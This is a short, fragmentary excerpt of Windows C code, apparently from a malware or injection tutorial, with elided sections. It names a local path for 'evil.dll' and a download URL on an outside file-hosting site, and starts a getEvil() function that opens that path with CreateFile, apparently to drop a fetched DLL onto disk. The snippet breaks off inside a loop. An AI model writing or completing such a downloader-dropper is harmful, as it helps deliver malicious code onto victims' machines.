...
char evilDLL[] = "C:\\Temp\\evil.dll"; // evil.dll path
char evilURL[] = "https://tmpfiles.org/dl/1288841/evil.dll";
...
char* getEvil() {
    ...
    HANDLE hFile = CreateFile((LPCSTR)"C:\\Temp\\evil.dll", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    do {
